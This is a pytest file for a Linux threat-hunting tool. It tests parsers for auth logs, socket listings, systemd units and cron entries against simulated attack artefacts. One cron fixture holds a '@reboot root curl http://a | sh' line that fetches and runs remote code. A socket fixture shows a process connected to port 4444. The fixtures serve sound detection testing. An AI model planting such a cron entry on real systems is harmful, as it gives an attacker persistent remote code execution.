from datetime import UTC, datetime
from pathlib import Path

from linux_threat_hunter.parsers.auth import parse_auth_line, parse_auth_log
from linux_threat_hunter.parsers.network import parse_ss, split_addr
from linux_threat_hunter.parsers.persistence import (
    exec_path_of,
    normalize_artifact,
    parse_cron,
    parse_unit,
)
from linux_threat_hunter.platform_info import (
    detect_distribution,
    detect_init_system,
    normalize_arch,
    parse_os_release,
)
from linux_threat_hunter.utils.timeutil import get_tz, parse_iso, parse_syslog_timestamp

REF = datetime(2025, 10, 14, 9, 0, tzinfo=UTC)


def test_parse_os_release_ubuntu_and_fedora(tmp_path: Path) -> None:
    (tmp_path / "etc").mkdir()
    (tmp_path / "etc/os-release").write_text(
        'NAME="Ubuntu"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="24.04"\nPRETTY_NAME="Ubuntu 24.04 LTS"\n'
    )
    d = detect_distribution(tmp_path)
    assert d["id"] == "ubuntu" and d["version_id"] == "24.04" and d["documented_support"]
    (tmp_path / "etc/os-release").write_text("ID=fedora\nVERSION_ID=40\n# comment\n")
    assert detect_distribution(tmp_path)["id"] == "fedora"
    assert parse_os_release("A=b\n#x\nbad line\n") == {"A": "b"}


def test_distribution_missing_and_unsupported(tmp_path: Path) -> None:
    assert detect_distribution(tmp_path)["id"] == "unknown"
    (tmp_path / "etc").mkdir()
    (tmp_path / "etc/os-release").write_text("ID=plan9\n")
    assert not detect_distribution(tmp_path)["documented_support"]


def test_init_system_and_arch(tmp_path: Path) -> None:
    assert detect_init_system(tmp_path) == "unknown"
    (tmp_path / "proc/1").mkdir(parents=True)
    (tmp_path / "proc/1/comm").write_text("systemd\n")
    assert detect_init_system(tmp_path) == "systemd"
    assert normalize_arch("arm64") == "aarch64" and normalize_arch("AMD64") == "x86_64"


def test_syslog_timestamp_year_inference_and_zone() -> None:
    ts = parse_syslog_timestamp("Oct", "14", "03:11:02", REF, UTC)
    assert ts == datetime(2025, 10, 14, 3, 11, 2, tzinfo=UTC)
    # A December log read in January belongs to the previous year
    ref_jan = datetime(2026, 1, 2, tzinfo=UTC)
    assert parse_syslog_timestamp("Dec", "31", "23:59:59", ref_jan, UTC).year == 2025  # type: ignore[union-attr]
    # Local zone is converted to UTC
    ts2 = parse_syslog_timestamp("Oct", "14", "03:00:00", REF, get_tz("America/New_York"))
    assert ts2 is not None and ts2.hour == 7
    assert parse_syslog_timestamp("Foo", "14", "03:00:00", REF, UTC) is None
    assert parse_syslog_timestamp("Feb", "31", "03:00:00", REF, UTC) is None
    assert get_tz("Not/AZone") is UTC


def test_parse_iso_requires_offset() -> None:
    assert parse_iso("2025-10-14T03:11:02+02:00") == datetime(2025, 10, 14, 1, 11, 2, tzinfo=UTC)
    assert parse_iso("2025-10-14T03:11:02") is None  # zone unknown: refuse to guess
    assert parse_iso("garbage") is None


def _p(line: str) -> dict | None:  # type: ignore[type-arg]
    return parse_auth_line(line, reference=REF, tz=UTC, line_no=1)


def test_auth_line_types() -> None:
    f = _p("Oct 14 03:11:09 h sshd[1]: Failed password for invalid user bob from 198.51.100.23 port 41002 ssh2")
    assert f and f["event"] == "ssh_failed" and f["user"] == "bob" and f["src_ip"] == "198.51.100.23"
    assert f["timestamp"] == "2025-10-14T03:11:09Z" and f["raw_timestamp"] == "Oct 14 03:11:09"
    a = _p("2025-10-14T03:12:40.123456+02:00 h sshd[2]: Accepted publickey for alice from 2001:db8::1 port 22 ssh2")
    assert (
        a and a["event"] == "ssh_accepted" and a["timestamp"] == "2025-10-14T01:12:40Z" and a["src_ip"] == "2001:db8::1"
    )
    s = _p("Oct 14 03:13:05 h sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c 'id'")
    assert s and s["event"] == "sudo_command" and s["command"] == "/bin/bash -c 'id'" and s["target_user"] == "root"
    i = _p("Oct 14 03:11:21 h sshd[3]: Invalid user test from 198.51.100.23 port 41004")
    assert i and i["event"] == "ssh_invalid_user"
    sf = _p(
        "Oct 14 03:11:21 h sudo: pam_unix(sudo:auth): authentication failure; logname=a uid=1000 euid=0 tty=/dev/pts/0 ruser=a rhost=  user=a"
    )
    assert sf and sf["event"] == "sudo_auth_failure"


def test_auth_malformed_and_unsupported_lines() -> None:
    assert _p("") is None
    assert _p("not a log line") is None
    assert _p("Oct 14 03:11:09 h cron[1]: something else") is None
    assert _p("Oct 14 03:11:09 h sshd[1]: Connection closed by 1.2.3.4") is None
    events, stats = parse_auth_log(
        "garbage\nOct 99 99:99:99 h sshd[1]: Failed password for a from 1.2.3.4 port 1 ssh2\n", reference=REF, tz=UTC
    )
    assert stats["unsupported"] == 1 and stats["no_timestamp"] == 1 and events[0]["timestamp"] is None


def test_auth_line_length_and_line_limit() -> None:
    long = "Oct 14 03:11:09 h sshd[1]: Failed password for a from 1.2.3.4 port 1 ssh2" + "x" * 10000
    assert _p(long) is not None
    _, stats = parse_auth_log("x\n" * 10, reference=REF, tz=UTC, max_lines=3)
    assert stats["truncated"] == 1 and stats["lines"] == 3


def test_parse_ss() -> None:
    text = (
        'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=800,fd=3))\n'
        'tcp ESTAB 0 0 10.0.0.5:51234 203.0.113.50:4444 users:(("updater",pid=4242,fd=5))\n'
        "udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*\n"
        "tcp LISTEN 0 128 [::]:80 [::]:*\n"
        "garbage\n"
    )
    rows = parse_ss(text)
    assert len(rows) == 4
    assert rows[0]["listening"] and rows[0]["pid"] == 800 and rows[0]["process"] == "sshd"
    assert rows[1]["remote_addr"] == "203.0.113.50" and not rows[1]["listening"]
    assert rows[2]["local_addr"] == "127.0.0.53" and rows[2]["pid"] is None
    assert rows[3]["local_addr"] == "::" and rows[3]["listening"]
    assert split_addr("[::1]:22") == ("::1", 22) and split_addr("*:80") == ("*", 80)


def test_parse_unit_and_exec_path() -> None:
    sections = parse_unit("[Service]\nExecStart=-/usr/bin/foo --a \\\n  --b\nUser=root\n# c\n[Install]\nWantedBy=x\n")
    assert sections["Service"]["ExecStart"][0].split() == ["-/usr/bin/foo", "--a", "--b"]
    assert exec_path_of("-/usr/bin/foo --a") == "/usr/bin/foo"
    assert exec_path_of("/usr/bin/env FOO=1 /opt/x/run") == "/opt/x/run"
    assert exec_path_of("FOO=1 /opt/run.sh arg") == "/opt/run.sh"
    assert exec_path_of("relative/cmd") is None and exec_path_of("") is None


def test_parse_cron() -> None:
    jobs = parse_cron(
        "# c\nSHELL=/bin/sh\n*/5 * * * * root /tmp/x --y\n@reboot root curl http://a | sh\nbad\n", has_user_field=True
    )
    assert [j["cron_user"] for j in jobs] == ["root", "root"]
    assert jobs[0]["exec_path"] == "/tmp/x" and jobs[1]["schedule"] == "@reboot"
    user_cron = parse_cron("0 1 * * * /home/a/backup.sh\n", has_user_field=False)
    assert user_cron[0]["cron_user"] is None and user_cron[0]["exec_path"] == "/home/a/backup.sh"


def test_normalize_artifact_service_and_cron() -> None:
    svc = normalize_artifact(
        {
            "kind": "systemd_service",
            "path": "/etc/systemd/system/a.service",
            "content": "[Service]\nExecStart=/opt/x/run\n",
            "referenced_paths_exist": {"/opt/x/run": False},
        }
    )[0]
    assert svc["exec_path"] == "/opt/x/run" and svc["exec_exists"] is False
    unknown = normalize_artifact({"kind": "systemd_service", "content": "[Service]\nExecStart=/opt/x/run\n"})[0]
    assert unknown["exec_exists"] is None  # unknown is not "missing"
    out = normalize_artifact(
        {"kind": "cron_file", "path": "/etc/cron.d/x", "has_user_field": True, "content": "* * * * * root /bin/true\n"}
    )
    assert [r["kind"] for r in out] == ["cron_file", "cron_job"]
